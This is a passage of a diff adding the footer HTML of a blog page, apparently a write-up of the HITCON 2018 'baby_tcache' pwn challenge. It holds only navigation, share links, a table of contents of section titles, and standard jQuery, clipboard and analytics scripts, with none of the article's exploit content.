+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#overlapping-chunk"><span class="toc-number">1.</span> <span class="toc-text">overlapping chunk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IO-2-1-stdout%E5%85%A5%E9%93%BE"><span class="toc-number">2.</span> <span class="toc-text">IO_2_1_stdout入链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2libc"><span class="toc-number">3.</span> <span class="toc-text">泄露libc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#freehook"><span class="toc-number">4.</span> <span class="toc-text">freehook</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">5.</span> <span class="toc-text">EXP</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/04/19/HITCON-2018-PWN-baby-tcache/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/04/19/HITCON-2018-PWN-baby-tcache/&text=2018 HITCON PWN baby_tcache"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/04/19/HITCON-2018-PWN-baby-tcache/&title=2018 HITCON PWN baby_tcache"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/04/19/HITCON-2018-PWN-baby-tcache/&is_video=false&description=2018 HITCON PWN baby_tcache"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2018 HITCON PWN baby_tcache&body=Check out this article: https://grxer.gitee.io/2023/04/19/HITCON-2018-PWN-baby-tcache/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/04/19/HITCON-2018-PWN-baby-tcache/&title=2018 HITCON PWN baby_tcache"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/04/19/HITCON-2018-PWN-baby-tcache/&title=2018 HITCON PWN baby_tcache"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/04/19/HITCON-2018-PWN-baby-tcache/&title=2018 HITCON PWN baby_tcache"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/04/19/HITCON-2018-PWN-baby-tcache/&title=2018 HITCON PWN baby_tcache"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/04/19/HITCON-2018-PWN-baby-tcache/&name=2018 HITCON PWN baby_tcache&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/04/19/HITCON-2018-PWN-baby-tcache/&t=2018 HITCON PWN baby_tcache"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023
+    Grxer
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?a22ef0bec4e4a9c7337bea6e37ff55c1";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
